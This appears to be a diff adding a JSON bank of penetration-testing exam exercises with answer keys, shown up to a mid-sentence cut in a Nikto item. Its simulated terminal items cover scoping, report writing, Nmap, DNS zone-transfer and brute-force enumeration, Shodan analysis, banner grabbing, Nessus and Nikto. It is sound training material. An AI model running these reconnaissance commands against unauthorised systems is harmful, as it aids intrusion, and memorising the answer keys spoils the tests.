@@ -1,1 +1,1142 @@
-[]
+[
+  {
+    "id": "comptia-pre-engagement-ordering",
+    "title": "Order the Pre-Engagement Steps",
+    "description": "Place the six pre-engagement activities in the correct chronological order before any active testing begins.",
+    "type": "ordering",
+    "timeLimit": 300,
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Engagement Management",
+    "technologies": ["Rules of Engagement", "Scoping", "Contracts"],
+    "labCategory": "Implement",
+    "scenario": "You have been hired to perform a penetration test against Acme Corp's external network. Before any scanning or exploitation can begin, the pre-engagement phase must be completed in the correct order.\n\nArrange the following six activities in the order they should be completed.",
+    "steps": [
+      {
+        "id": "s1",
+        "text": "Obtain and sign a Non-Disclosure Agreement (NDA) with the client",
+        "correctPosition": 1
+      },
+      {
+        "id": "s2",
+        "text": "Define the scope: target IP ranges, domains, and explicitly excluded systems",
+        "correctPosition": 2
+      },
+      {
+        "id": "s3",
+        "text": "Draft the Rules of Engagement (RoE) document covering permitted techniques and emergency contacts",
+        "correctPosition": 3
+      },
+      {
+        "id": "s4",
+        "text": "Obtain a signed written authorisation letter from the asset owner",
+        "correctPosition": 4
+      },
+      {
+        "id": "s5",
+        "text": "Agree on testing windows, blackout dates, and change-freeze periods with stakeholders",
+        "correctPosition": 5
+      },
+      {
+        "id": "s6",
+        "text": "Conduct a stakeholder kickoff call to confirm all parties understand the engagement parameters",
+        "correctPosition": 6
+      }
+    ],
+    "explanation": "The correct order reflects the legal and contractual dependencies of each step:\n\n1. **NDA first** — Confidentiality obligations must be in place before any sensitive information (scope, architecture, credentials) is shared.\n2. **Define scope** — You cannot write accurate rules of engagement until you know what is in and out of scope.\n3. **Rules of Engagement** — Only after scope is defined can you specify permitted techniques, tool restrictions, and escalation paths.\n4. **Authorisation letter** — This is the legal instrument that grants permission to test. It references the agreed scope and RoE and must be signed before any technical work begins.\n5. **Testing windows** — Once authorised, coordinate timing to avoid impacting production systems or clashing with change freezes.\n6. **Kickoff call** — The final step confirms all stakeholders — client IT, security team, and legal — have a shared understanding of the engagement before day one of testing.\n\nProceeding to active testing without a signed authorisation letter exposes the tester to criminal liability regardless of any prior verbal agreement."
+  },
+  {
+    "id": "comptia-report-sections-match",
+    "title": "Match Pentest Report Sections",
+    "description": "Match each section of a professional penetration test report to its correct description.",
+    "type": "drag-match",
+    "timeLimit": 300,
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Report Writing",
+    "technologies": ["Report Writing", "Executive Summary", "Risk Ratings", "Remediation"],
+    "labCategory": "Troubleshoot",
+    "scenario": "A junior analyst has mixed up the descriptions for each section of the final penetration test report. Match each report section to what it should contain.\n\nNote: confusing these sections is a common exam question topic — knowing what belongs in an executive summary versus a findings register is tested directly.",
+    "pairs": [
+      {
+        "id": "exec-summary",
+        "term": "Executive Summary",
+        "definition": "A non-technical narrative for senior leadership summarising overall risk posture, business impact of key findings, and the single most important remediation priority — no CVE numbers or tool output"
+      },
+      {
+        "id": "scope-methodology",
+        "term": "Scope and Methodology",
+        "definition": "Documents which systems were tested, the testing dates, the techniques used (black-box / grey-box / white-box), and any limitations or constraints that affected coverage"
+      },
+      {
+        "id": "findings-register",
+        "term": "Findings Register",
+        "definition": "A detailed table of every discovered vulnerability including CVE identifiers, CVSS scores, affected hosts, proof-of-concept steps, and evidence screenshots"
+      },
+      {
+        "id": "risk-matrix",
+        "term": "Risk Rating Matrix",
+        "definition": "Maps each finding to a likelihood and business-impact score to produce a final risk level (Critical / High / Medium / Low / Informational) using a defined scoring methodology such as CVSS or DREAD"
+      },
+      {
+        "id": "remediation",
+        "term": "Remediation Recommendations",
+        "definition": "Prioritised, actionable guidance for the client's engineering and operations teams — patch references, configuration changes, and short-term mitigations ordered by risk level"
+      },
+      {
+        "id": "appendix",
+        "term": "Appendix — Evidence",
+        "definition": "Raw supporting material: full tool output, packet captures, exploit payloads used during testing, and timestamped screenshots that substantiate every finding in the register"
+      }
+    ],
+    "explanation": "Each section has a distinct audience and purpose:\n\n- **Executive Summary** targets the board and C-suite. It must be entirely free of technical jargon. Its job is to convey business risk and justify remediation budget, not to list CVEs.\n- **Scope and Methodology** protects both parties legally — it defines exactly what was and was not tested, so neither side can dispute coverage after the fact.\n- **Findings Register** is the core technical deliverable for the security and engineering teams. Every finding must have enough detail to reproduce the vulnerability.\n- **Risk Rating Matrix** provides an objective, repeatable framework so findings can be prioritised. CVSS is the most common standard; DREAD is an alternative.\n- **Remediation Recommendations** should reference specific vendor advisories and configuration baselines (CIS Benchmarks) where available.\n- **Appendix** preserves chain-of-custody for evidence and allows the client to independently verify findings. It is also what would be examined if a legal dispute arose."
+  },
+  {
+    "id": "comptia-fix-scope-yaml",
+    "title": "Fix the Broken Engagement Scope Document",
+    "description": "A YAML engagement scope file contains four errors that would expose the tester to legal liability. Find and fix them all.",
+    "type": "code-fix",
+    "timeLimit": 600,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Rules of Engagement",
+    "technologies": ["Scoping", "YAML", "Rules of Engagement"],
+    "labCategory": "Troubleshoot",
+    "scenario": "Before a penetration test begins, the project manager generates a YAML scope document that is committed to the engagement repository and signed off by the client.\n\nThis file has four bugs:\n1. An out-of-scope subnet is also listed under `in_scope`\n2. The testing window contains an impossible time value\n3. A mandatory legal sign-off field is missing entirely\n4. The methodology does not match what was agreed in the contract (grey-box)\n\nFix all four issues.",
+    "language": "yaml",
+    "brokenCode": "engagement:\n  client: Acme Corp\n  test_type: external\n  methodology: black-box\n  in_scope:\n    - 10.0.1.0/24\n    - 10.0.5.0/24\n    - 192.168.10.0/24\n  out_of_scope:\n    - 10.0.5.0/24\n    - 10.0.99.0/24\n  testing_window: \"23:00-25:00\"\n  emergency_contact: security@acmecorp.com",
+    "correctCode": "engagement:\n  client: Acme Corp\n  test_type: external\n  methodology: grey-box\n  authorized_by: John Smith, CISO\n  in_scope:\n    - 10.0.1.0/24\n    - 192.168.10.0/24\n  out_of_scope:\n    - 10.0.5.0/24\n    - 10.0.99.0/24\n  testing_window: \"23:00-06:00\"\n  emergency_contact: security@acmecorp.com",
+    "validations": [
+      {
+        "field": "methodology",
+        "expected": "grey-box"
+      },
+      {
+        "field": "authorized_by",
+        "expected": "John Smith, CISO"
+      },
+      {
+        "field": "in_scope",
+        "expected": "10.0.5.0/24 removed"
+      },
+      {
+        "field": "testing_window",
+        "expected": "23:00-06:00"
+      }
+    ],
+    "explanation": "The four bugs and why each matters:\n\n1. **`methodology: black-box` → `grey-box`** — The contract specifies grey-box (partial knowledge provided by the client). Testing under black-box assumptions when credentials and architecture diagrams have already been shared misrepresents the engagement scope and produces an inaccurate report.\n\n2. **Missing `authorized_by`** — This field names the individual with authority to grant permission for the test. Without it, the document cannot serve as a legal authorisation instrument. If an incident occurs during testing, the tester needs to demonstrate explicit, named sign-off.\n\n3. **`10.0.5.0/24` in `in_scope`** — This subnet appears in `out_of_scope`, meaning the client has explicitly forbidden testing it. Scanning or exploiting it would constitute unauthorised access and could breach computer fraud legislation regardless of the broader engagement authorisation.\n\n4. **`testing_window: 23:00-25:00`** — `25:00` is not a valid time. The intended value is `23:00-06:00` (late night to early morning). Testing outside the agreed window — even accidentally — can trigger client incident response procedures and violate the Rules of Engagement."
+  },
+  {
+    "id": "comptia-nmap-enumeration",
+    "title": "Nmap Service and OS Enumeration",
+    "description": "Run the correct Nmap commands to perform a SYN scan, service version detection, OS fingerprinting, and XML output against a target host.",
+    "type": "cli",
+    "timeLimit": 480,
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Active Reconnaissance",
+    "technologies": ["Nmap", "TCP/IP", "Service Detection"],
+    "labCategory": "Implement",
+    "scenario": "A target host at 10.10.10.50 is in scope for an external penetration test. You need to enumerate its services, attempt OS fingerprinting, and save the results in XML format for import into your report tool.\n\nComplete each task in order using the simulated terminal below.",
+    "commands": [
+      {
+        "command": "nmap -sS -sV 10.10.10.50",
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0021s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n80/tcp   open  http    Apache httpd 2.4.41\n3306/tcp open  mysql   MySQL 8.0.32\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.43 seconds"
+      },
+      {
+        "command": "nmap -O 10.10.10.50",
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0018s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5\nOS details: Linux 5.4 - 5.15\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.72 seconds"
+      },
+      {
+        "command": "nmap -oX scan.xml 10.10.10.50",
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0019s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n[+] XML output saved to scan.xml"
+      }
+    ],
+    "expectedCommands": [
+      "nmap -sS -sV 10.10.10.50",
+      "nmap -O 10.10.10.50",
+      "nmap -oX scan.xml 10.10.10.50"
+    ],
+    "answers": [
+      {
+        "id": "a1",
+        "text": "Which flag performs a TCP SYN (half-open) scan?",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "What does the -sV flag add to a scan?",
+        "correct": true
+      },
+      {
+        "id": "a3",
+        "text": "Why is XML output preferred over the default text format for pentest reports?",
+        "correct": true
+      }
+    ],
+    "explanation": "**`-sS` (SYN scan)** — Sends a TCP SYN packet and waits for a SYN-ACK (open) or RST (closed). Because the three-way handshake is never completed, the connection is not logged by most application-level logging. Requires raw socket privileges (root/Administrator).\n\n**`-sT` (connect scan)** — Completes the full TCP handshake. Use when you don't have raw socket privileges, but the completed connection is logged by the target service.\n\n**`-sV` (version detection)** — After identifying open ports, Nmap probes each service with protocol-specific payloads to identify the application and version. This significantly increases scan time but is essential for accurate vulnerability correlation.\n\n**`-O` (OS detection)** — Uses TCP/IP stack fingerprinting (TTL values, window sizes, TCP options) to guess the OS. Accuracy decreases through NAT and packet-filtering devices.\n\n**`-oX`** — XML output can be imported directly into Metasploit (`db_import`), vulnerability management platforms, and report generation tools. It preserves the full scan structure in a machine-readable format, unlike the default greppable output.\n\nFor a full enumeration run, combine flags: `nmap -sS -sV -O -oX scan.xml 10.10.10.50`."
+  },
+  {
+    "id": "comptia-dns-enumeration",
+    "title": "DNS Enumeration Command Completion",
+    "description": "Complete five DNS enumeration commands covering MX record queries, zone transfers, standard enumeration, brute-force subdomain discovery, and reverse lookups.",
+    "type": "fill-command",
+    "timeLimit": 420,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "DNS Enumeration",
+    "technologies": ["dig", "dnsrecon", "DNS", "Zone Transfer"],
+    "labCategory": "Implement",
+    "scenario": "You are enumerating DNS for example.com during the reconnaissance phase. DNS enumeration can expose mail servers, internal hostnames, and zone data that maps the target's entire infrastructure.\n\nComplete each command by filling in the missing flag or argument.",
+    "questions": [
+      {
+        "id": "q1",
+        "template": "dig ___ example.com",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "record type",
+            "answer": "MX"
+          }
+        ],
+        "hint": "Query for mail exchange records"
+      },
+      {
+        "id": "q2",
+        "template": "dig @ns1.example.com ___ example.com",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "transfer type",
+            "answer": "AXFR"
+          }
+        ],
+        "hint": "Request a full zone transfer from the authoritative nameserver"
+      },
+      {
+        "id": "q3",
+        "template": "dnsrecon -d example.com -t ___",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "enumeration type",
+            "answer": "std"
+          }
+        ],
+        "hint": "Standard enumeration queries common record types (A, AAAA, MX, NS, SOA, TXT)"
+      },
+      {
+        "id": "q4",
+        "template": "dnsrecon -d example.com -D ___ -t brt",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "wordlist path",
+            "answer": "/usr/share/wordlists/dnsmap.txt"
+          }
+        ],
+        "hint": "Specify the wordlist for brute-force subdomain enumeration"
+      },
+      {
+        "id": "q5",
+        "template": "dig ___ 192.168.1.10",
+        "blanks": [
+          {
+            "id": "b1",
+            "placeholder": "reverse lookup flag",
+            "answer": "-x"
+          }
+        ],
+        "hint": "Perform a reverse DNS lookup (PTR record query) on an IP address"
+      }
+    ],
+    "explanation": "**Zone transfer (AXFR)** — A DNS zone transfer copies all DNS records from a primary to a secondary nameserver. Misconfigured DNS servers that allow AXFR from arbitrary clients leak the complete list of hostnames, IP addresses, mail servers, and internal naming conventions for a domain. On a well-configured server, AXFR returns `Transfer failed` for unauthorised requestors.\n\n**`dig MX`** — Reveals the domain's mail infrastructure. Mail server hostnames often expose internal naming patterns (e.g., `mail-internal.example.com`) and may point to hosts outside the primary web infrastructure.\n\n**`dnsrecon -t std`** — Queries standard record types (A, AAAA, MX, NS, SOA, SRV, TXT). The TXT records frequently contain SPF, DMARC, and DKIM configuration that reveals email security posture and third-party service relationships.\n\n**`dnsrecon -t brt`** — Brute-forces subdomain names from a wordlist by querying `<word>.example.com`. This reveals subdomains not visible in public DNS aggregators. Common wordlists include dnsmap.txt, subdomains-top1million.txt, and SecLists DNS names.\n\n**`dig -x`** — Performs a PTR (reverse pointer) lookup. In internal networks, PTR records often reveal hostnames for IP addresses gathered by earlier Nmap scans, tying IPs to meaningful system names (e.g., `dc01.corp.local`)."
+  },
+  {
+    "id": "comptia-shodan-osint",
+    "title": "Passive OSINT: Shodan Output Analysis",
+    "description": "Analyse a Shodan API response for a target organisation and identify the exposed service with no authentication, the EOL software version, and the out-of-scope finding.",
+    "type": "log-analysis",
+    "timeLimit": 420,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Passive Reconnaissance",
+    "technologies": ["Shodan", "OSINT", "Banner Grabbing", "CVE"],
+    "labCategory": "Troubleshoot",
+    "scenario": "During passive reconnaissance for a client engagement, you run a Shodan query against the target organisation's IP range. Passive recon means you are querying Shodan's existing index — you are NOT sending packets to the target.\n\nReview the four service entries below and answer the questions that follow.",
+    "logs": [
+      {
+        "timestamp": "2026-04-10T08:14:22Z",
+        "level": "INFO",
+        "source": "Shodan API / 203.0.113.45:9200",
+        "message": "service=elasticsearch version=7.10.0 auth=none cluster_name=prod-search indices=[users,orders,logs] docs_count=4200000 http_banner=\"HTTP/1.1 200 OK\\nContent-Type: application/json\\n{\\\"name\\\":\\\"node-1\\\",\\\"cluster_name\\\":\\\"prod-search\\\",\\\"tagline\\\":\\\"You Know, for Search\\\"}\""
+      },
+      {
+        "timestamp": "2026-04-10T08:14:23Z",
+        "level": "WARN",
+        "source": "Shodan API / 203.0.113.45:80",
+        "message": "service=http server=Apache/2.2.31 os=Linux banner=\"Apache/2.2.31 (Ubuntu) Server at corp-target.com Port 80\" note=EOL_since_2018 cve_count=12 critical_cves=[CVE-2017-9798,CVE-2017-7679]"
+      },
+      {
+        "timestamp": "2026-04-10T08:14:24Z",
+        "level": "WARN",
+        "source": "Shodan API / 203.0.113.45:3389",
+        "message": "service=rdp port=3389 os=Windows_Server_2019 ssl=false nla=disabled banner=\"Remote Desktop Protocol\" note=internet_exposed"
+      },
+      {
+        "timestamp": "2026-04-10T08:14:25Z",
+        "level": "INFO",
+        "source": "Shodan API / 203.0.113.78:443",
+        "message": "service=https server=Cloudflare org=Cloudflare_Inc asn=AS13335 hostname=cdn.corp-target.com note=CDN_edge_node scope=infrastructure_not_owned"
+      }
+    ],
+    "answers": [
+      {
+        "id": "a1",
+        "text": "Elasticsearch on port 9200 (no authentication required — returns cluster data to anonymous requests)",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "Apache 2.2.31 (end-of-life since 2018 with 12 known CVEs including two critical RCE vulnerabilities)",
+        "correct": true
+      },
+      {
+        "id": "a3",
+        "text": "Cloudflare CDN endpoint on 203.0.113.78 (infrastructure not owned by the client — testing it would be out of scope)",
+        "correct": true
+      },
+      {
+        "id": "a4",
+        "text": "RDP on port 3389 with NLA disabled (valid finding — internet-exposed RDP without Network Level Authentication is in scope)",
+        "correct": false
+      }
+    ],
+    "explanation": "**Why passive recon matters** — Shodan, Censys, and similar tools query their own pre-crawled indexes. No packets reach the target during this phase. This means passive recon can be conducted before the testing window opens and from any network without appearing in the target's firewall logs.\n\n**Elasticsearch port 9200 — no auth** — Default Elasticsearch installations prior to version 8.0 have no built-in authentication. A cluster with 4.2 million documents returned by an anonymous HTTP GET is a critical finding: full data exfiltration requires only a web browser.\n\n**Apache 2.2.31 — EOL software** — Apache 2.2 reached end-of-life in December 2017. CVE-2017-9798 (Optionsbleed) and CVE-2017-7679 (mod_mime buffer overread) are critical/high severity with public exploit code. EOL software receives no security patches, so any new vulnerability discovered after 2017 is permanently unpatched.\n\n**Cloudflare CDN — out of scope** — The IP 203.0.113.78 belongs to Cloudflare's ASN (AS13335), not the client. The engagement scope covers systems owned by the client. Scanning or exploiting Cloudflare infrastructure without Cloudflare's explicit authorisation is unauthorised access under computer fraud laws, regardless of the client's scope document.\n\n**RDP port 3389 — valid in-scope finding** — Internet-exposed RDP with NLA disabled is a high-severity finding but it belongs to the client and falls within scope. It should be documented in the findings register, not excluded."
+  },
+  {
+    "id": "comptia-whois-banner-fix",
+    "title": "Fix a Broken Python WHOIS/Banner Grabbing Script",
+    "description": "A Python reconnaissance script has three bugs: a missing type cast on the socket port argument, a deprecated whois keyword argument, and a bare decode() call that crashes on binary responses. Fix all three.",
+    "type": "code-fix",
+    "timeLimit": 600,
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Script Modification",
+    "technologies": ["Python", "WHOIS", "Socket", "Banner Grabbing"],
+    "labCategory": "Implement",
+    "scenario": "During the reconnaissance phase you are using a Python script to automate WHOIS lookups and TCP banner grabbing against a list of target hosts.\n\nThe script has three bugs that prevent it from running correctly:\n1. The socket port argument is passed as a string, not an integer\n2. The whois library call uses a deprecated keyword argument name\n3. The banner decode() call has no error handler, causing crashes when services return binary data\n\nFix all three issues.",
+    "language": "python",
+    "brokenCode": "import socket\nimport whois\nimport sys\n\nTARGETS = [\n    (\"10.10.10.50\", \"22\"),\n    (\"10.10.10.50\", \"80\"),\n    (\"10.10.10.50\", \"3306\"),\n]\n\nDOMAINS = [\"example.com\", \"corp-target.com\"]\n\n\ndef grab_banner(host, port):\n    \"\"\"Connect to host:port and return the service banner.\"\"\"\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(3)\n        s.connect((host, port))\n        s.send(b\"HEAD / HTTP/1.0\\r\\n\\r\\n\")\n        banner = s.recv(1024)\n        s.close()\n        return banner.decode()\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\ndef whois_lookup(domain):\n    \"\"\"Return registrar and creation date for a domain.\"\"\"\n    try:\n        w = whois.whois(domain, flags=0)\n        return f\"{domain}: registrar={w.registrar}, created={w.creation_date}\"\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\nif __name__ == \"__main__\":\n    print(\"=== Banner Grabbing ===\")\n    for host, port in TARGETS:\n        banner = grab_banner(host, port)\n        print(f\"  {host}:{port} -> {banner}\")\n\n    print(\"\\n=== WHOIS Lookups ===\")\n    for domain in DOMAINS:\n        result = whois_lookup(domain)\n        print(f\"  {result}\")",
+    "correctCode": "import socket\nimport whois\nimport sys\n\nTARGETS = [\n    (\"10.10.10.50\", \"22\"),\n    (\"10.10.10.50\", \"80\"),\n    (\"10.10.10.50\", \"3306\"),\n]\n\nDOMAINS = [\"example.com\", \"corp-target.com\"]\n\n\ndef grab_banner(host, port):\n    \"\"\"Connect to host:port and return the service banner.\"\"\"\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(3)\n        s.connect((host, int(port)))\n        s.send(b\"HEAD / HTTP/1.0\\r\\n\\r\\n\")\n        banner = s.recv(1024)\n        s.close()\n        return banner.decode(errors='ignore')\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\ndef whois_lookup(domain):\n    \"\"\"Return registrar and creation date for a domain.\"\"\"\n    try:\n        w = whois.whois(domain)\n        return f\"{domain}: registrar={w.registrar}, created={w.creation_date}\"\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\nif __name__ == \"__main__\":\n    print(\"=== Banner Grabbing ===\")\n    for host, port in TARGETS:\n        banner = grab_banner(host, port)\n        print(f\"  {host}:{port} -> {banner}\")\n\n    print(\"\\n=== WHOIS Lookups ===\")\n    for domain in DOMAINS:\n        result = whois_lookup(domain)\n        print(f\"  {result}\")",
+    "validations": [
+      {
+        "field": "socket.connect port cast",
+        "expected": "int(port)"
+      },
+      {
+        "field": "whois keyword argument",
+        "expected": "flags=0 removed"
+      },
+      {
+        "field": "decode error handler",
+        "expected": "errors='ignore'"
+      }
+    ],
+    "explanation": "**Bug 1 — `s.connect((host, port))` → `s.connect((host, int(port)))`**\n\n`socket.connect()` requires the port to be an integer. The `TARGETS` list stores ports as strings (`\"22\"`, `\"80\"`). Passing a string raises `TypeError: an integer is required`. This is a common mistake when ports are read from config files or command-line arguments where all values arrive as strings.\n\n**Bug 2 — `whois.whois(domain, flags=0)` → `whois.whois(domain)`**\n\nThe `flags` keyword argument was removed in python-whois 0.8.0. Passing it raises `TypeError: whois() got an unexpected keyword argument 'flags'`. Always check library changelogs when adapting older scripts — deprecated arguments are a frequent source of breakage when dependencies are updated.\n\n**Bug 3 — `banner.decode()` → `banner.decode(errors='ignore')`**\n\n`bytes.decode()` defaults to UTF-8 strict mode. Many services (databases, proprietary protocols, binary handshakes) return bytes that are not valid UTF-8. A bare `decode()` raises `UnicodeDecodeError` and crashes the function. Passing `errors='ignore'` silently drops invalid bytes, allowing the banner to be captured even from binary-protocol services. For forensic work, `errors='replace'` (substitutes `\ufffd`) is preferable as it preserves byte position information."
+  },
+  {
+    "id": "comptia-nessus-authenticated-scan",
+    "title": "Configure Nessus for Authenticated Scanning",
+    "description": "Fix four misconfigured Nessus scan policy settings to produce a valid authenticated internal penetration test scan.",
+    "type": "config-toggle",
+    "timeLimit": 360,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Vulnerability Scanning",
+    "technologies": ["Nessus", "Authenticated Scanning", "Credentials", "SSH"],
+    "labCategory": "Implement",
+    "scenario": "A junior analyst prepared a Nessus scan policy for an internal network assessment, but made four configuration errors. As currently saved, the policy will run an unauthenticated stealth scan with active checks suppressed — significantly reducing finding coverage.\n\nCorrect each setting to match the requirements for a valid authenticated internal penetration test.",
+    "configItems": [
+      {
+        "id": "credentialed_scanning",
+        "label": "Credentialed Scanning",
+        "shortLabel": "Auth",
+        "currentValue": "off",
+        "correctValue": "on",
+        "inputType": "select",
+        "options": ["on", "off"]
+      },
+      {
+        "id": "ssh_username",
+        "label": "SSH Username",
+        "shortLabel": "SSH User",
+        "currentValue": "",
+        "correctValue": "pentest",
+        "inputType": "text"
+      },
+      {
+        "id": "scan_type",
+        "label": "Scan Intensity",
+        "shortLabel": "Intensity",
+        "currentValue": "stealth",
+        "correctValue": "normal",
+        "inputType": "select",
+        "options": ["normal", "stealth", "aggressive", "custom"]
+      },
+      {
+        "id": "safe_checks",
+        "label": "Safe Checks Override",
+        "shortLabel": "Safe Checks",
+        "currentValue": "enabled",
+        "correctValue": "disabled",
+        "inputType": "select",
+        "options": ["enabled", "disabled"]
+      }
+    ],
+    "explanation": "**Credentialed Scanning (off → on)**\n\nUnauthenticated scans can only detect services visible from the network and check banners for known vulnerabilities. Credentialed scans log in using the supplied credentials and enumerate installed packages, patch levels, and configuration files from inside the host. Studies consistently show credentialed scans detect 2–3× more vulnerabilities than unauthenticated scans of the same host.\n\n**SSH Username (blank → pentest)**\n\nNessus requires a valid credential to perform authenticated checks. Leaving the SSH username blank means the credentialed scan option has no effect — Nessus falls back to unauthenticated checks silently. This is a common misconfiguration that produces deceptively thin reports with unexpectedly few findings.\n\n**Scan Intensity (stealth → normal)**\n\nStealth mode throttles probe rates and skips aggressive plugin families to reduce IDS/IPS detection. While appropriate for red team engagements, an internal penetration test with agreed testing windows should use normal intensity to ensure all plugin categories fire and no findings are missed due to scan throttling.\n\n**Safe Checks Override (enabled → disabled)**\n\nWhen safe checks is enabled, Nessus skips any plugin that could crash or destabilise a host. For a penetration test this prevents active exploitation plugins from running — resulting in false negatives for denial-of-service and overflow vulnerabilities. Disable safe checks only when disruption has been explicitly approved in the Rules of Engagement."
+  },
+  {
+    "id": "comptia-nikto-web-scan",
+    "title": "Nikto Web Application Scan",
+    "description": "Run Nikto web scanner commands to identify vulnerabilities on a target web server running outdated Apache, exposed phpMyAdmin, and missing security headers.",
+    "type": "cli",
+    "timeLimit": 420,
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Web Application Scanning",
+    "technologies": ["Nikto", "Web Application Testing", "HTTP"],
+    "labCategory": "Implement",
+    "scenario": "A target web server runs at http://10.10.10.80 and also serves HTTPS on port 443. You need to: (1) run a basic Nikto scan against the HTTP service, (2) re-run with SSL/TLS support against port 443, and (3) save output to a file for the pentest report.\n\nComplete each task using the simulated terminal below.",
+    "commands": [
+      {
+        "command": "nikto -h http://10.10.10.80",
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:23:44 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined.\n+ The X-Content-Type-Options header is not set.\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin is for managing MySQL databases, and should be protected.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host\n+ End Time:           2024-01-15 09:25:12 (GMT0) (88 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested"
+      },
+      {
+        "command": "nikto -h 10.10.10.80 -ssl -p 443",
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        443\n+ SSL Info:           Subject: /CN=10.10.10.80\n                     Ciphers: TLS_AES_256_GCM_SHA384\n                     Issuer:  /CN=10.10.10.80\n+ Start Time:         2024-01-15 09:26:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin accessible via HTTPS.\n+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host\n+ End Time:           2024-01-15 09:27:45 (GMT0) (105 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested"
+      },
+      {
+        "command": "nikto -h 10.10.10.80 -o output.txt",
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:28:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 4 item(s) reported on remote host\n+ End Time:           2024-01-15 09:29:55 (GMT0) (115 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n[+] Results saved to output.txt"
+      }
+    ],
+    "expectedCommands": [
+      "nikto -h http://10.10.10.80",
+      "nikto -h 10.10.10.80 -ssl -p 443",
+      "nikto -h 10.10.10.80 -o output.txt"
+    ],
+    "answers": [
+      {
+        "id": "a1",
+        "text": "What does the -ssl flag enable when scanning port 443?",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "Why is Apache 2.2.31 flagged as a finding by Nikto?",
+        "correct": true
+      },
+      {
+        "id": "a3",
+        "text": "How does saving output with -o benefit the pentest reporting process?",
+        "correct": true
+      }
+    ],
+    "explanation": "**Nikto's role in web application testing**\n\nNikto is a fast, open-source web server scanner that checks for over 6,700 potentially dangerous files, outdated server software, and version-specific problems. It is best described as a surface-area scanner — it identifies low-hanging fruit quickly but lacks the depth of tools like Burp Suite for manual injection testing.\n\n**`-ssl` flag**\n\nWithout `-ssl`, Nikto communicates over plain HTTP. Adding `-ssl` instructs Nikto to initiate a TLS handshake before sending probes, enabling scanning of HTTPS services. Combined with `-p 443`, it targets the standard HTTPS port. Omitting `-ssl` when scanning an HTTPS service results in a failed connection and zero findings.\n\n**Apache 2.2.31 — EOL finding**\n\nApache 2.2.x reached end-of-life in 2017. Running EOL software means no security patches are released for newly discovered vulnerabilities. Nikto cross-references the `Server` header against its vulnerability database and flags the version as outdated. This finding should be reported with the recommended upgrade path to a supported 2.4.x release.\n\n**`-o` output flag**\n\nThe `-o` flag saves results to a file. The output format is 